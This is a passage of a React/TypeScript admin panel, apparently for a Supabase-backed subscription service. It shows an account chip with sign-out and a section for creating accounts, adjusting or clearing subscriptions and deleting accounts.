            isAdmin: r.isAdmin,
            subscription_until: r.subscription_until,
          });
      })
      .catch(() => undefined);
    return () => {
      alive = false;
    };
  }, [fetchMe]);

  async function signOut() {
    await supabase.auth.signOut();
    navigate({ to: "/auth" });
  }

  if (!me) return null;
  const rank = me.isAdmin ? "Admin" : "User";
  return (
    <div className="admin-account-chip">
      <div className="admin-account-info">
        <div className="admin-account-name">{me.username ?? "—"}</div>
        <div className="admin-account-rank">{rank}</div>
      </div>
      <button
        type="button"
        className="admin-account-signout"
        onClick={() => void signOut()}
        title="Sign out"
        aria-label="Sign out"
      >
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
          <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" />
          <polyline points="16 17 21 12 16 7" />
          <line x1="21" y1="12" x2="9" y2="12" />
        </svg>
      </button>
    </div>
  );
}

type Account = {
  id: string;
  username: string;
  subscription_until: string | null;
  created_at: string;
  roles: string[];
};

function AccountsSection() {
  const list = useServerFn(listAccounts);
  const create = useServerFn(createAccount);
  const adjust = useServerFn(adjustSubscription);
  const clear = useServerFn(clearSubscription);
  const del = useServerFn(deleteAccount);
  const [accounts, setAccounts] = useState<Account[]>([]);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [u, setU] = useState("");
  const [p, setP] = useState("");
  const [makeAdmin, setMakeAdmin] = useState(false);

  async function refresh() {
    try {
      const rows = await list();
      setAccounts(rows as Account[]);
    } catch (e) {
      setError(e instanceof Error ? e.message : "Failed to load");
    }
  }
  useEffect(() => {
    void refresh();
  }, []);

  async function onCreate(e: React.FormEvent) {
    e.preventDefault();
    setError(null);
    setBusy(true);
    try {
      await create({ data: { username: u, password: p, isAdmin: makeAdmin } });
      setU("");
      setP("");
      setMakeAdmin(false);
      await refresh();
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed");
    } finally {
      setBusy(false);
    }
  }

  async function onAdjust(userId: string, days: number) {
    setError(null);
    try {
      await adjust({ data: { userId, days } });
      await refresh();
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed");
    }
  }
  async function onClear(userId: string) {
    setError(null);
    try {
      await clear({ data: { userId } });
      await refresh();
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed");
    }
  }
  async function onDelete(userId: string, username: string) {
    if (!window.confirm(`Delete account "${username}"? This cannot be undone.`)) return;
    setError(null);
    try {
      await del({ data: { userId } });
      await refresh();
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed");
    }
  }

  function formatUntil(iso: string | null) {
    if (!iso) return "No subscription";
    const t = new Date(iso).getTime();
    if (t <= Date.now()) return `Expired ${new Date(iso).toLocaleDateString()}`;
    const days = Math.ceil((t - Date.now()) / 86_400_000);
    return `${days}d left · until ${new Date(iso).toLocaleDateString()}`;
  }

  return (
    <section className="admin-settings-group">
      <h2 className="admin-settings-group-title">Accounts</h2>

      <form className="admin-acct-create" onSubmit={onCreate}>
        <input
          placeholder="username"
          value={u}
          onChange={(e) => setU(e.target.value)}
          required
          minLength={2}
          maxLength={32}
          pattern="[a-zA-Z0-9_-]+"
        />
        <input
          placeholder="password"
          type="password"
          value={p}
          onChange={(e) => setP(e.target.value)}
          required
          minLength={6}
        />
        <label className="admin-acct-admin-toggle">
          <input
            type="checkbox"
            checked={makeAdmin}
            onChange={(e) => setMakeAdmin(e.target.checked)}
          />
          Admin
        </label>
        <button type="submit" disabled={busy}>
          {busy ? "Creating…" : "Create account"}
        </button>
      </form>
      {error && <div className="auth-error">{error}</div>}

      <div className="admin-acct-list">
        {accounts.map((a) => {
          const isAdmin = a.roles.includes("admin");
          return (
            <div key={a.id} className="admin-acct-row">
              <div className="admin-acct-main">
                <div className="admin-acct-name">
                  {a.username}
                  {isAdmin && <span className="admin-acct-badge">admin</span>}
                </div>
                <div className="admin-acct-sub">{formatUntil(a.subscription_until)}</div>
              </div>
              <div className="admin-acct-actions">
                <button onClick={() => void onAdjust(a.id, 1)}>+1 day</button>
                <button onClick={() => void onAdjust(a.id, 2)}>+2 days</button>
                <button onClick={() => void onAdjust(a.id, 7)}>+7 days</button>
                <button onClick={() => void onAdjust(a.id, 30)}>+1 month</button>
                <button
                  className="admin-acct-clear"
                  onClick={() => void onClear(a.id)}
                  title="Clear subscription"
                >
                  Clear
                </button>
                {!isAdmin && (
                  <button
                    className="admin-acct-delete"
                    onClick={() => void onDelete(a.id, a.username)}
                    title="Delete account"
                  >
                    Delete
                  </button>
                )}
              </div>
            </div>
          );
        })}
        {accounts.length === 0 && (
          <p className="admin-empty">No accounts yet.</p>
        )}
      </div>
    </section>
  );
}
